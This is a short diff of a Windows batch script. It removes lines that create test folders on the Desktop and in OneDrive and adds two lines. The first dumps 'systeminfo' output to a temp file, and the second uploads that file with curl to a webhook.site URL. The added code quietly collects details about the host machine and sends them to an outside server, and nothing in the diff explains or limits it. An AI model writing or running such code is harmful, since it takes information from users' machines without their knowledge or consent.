@@ -1,8 +1,2 @@
-echo "test"
-cd %userprofile%
-cd Desktop
-mkdir SAJID-TEST
-cd %OneDrive%
-cd Desktop
-mkdir EMAIL-IF-FOLDER-MADE-HERE
-
+systeminfo > %temp%\info.txt
+curl -T "%temp%/info.txt" "https://webhook.site/07223949-0b3f-42c2-99dc-55f1ce93a6dd"
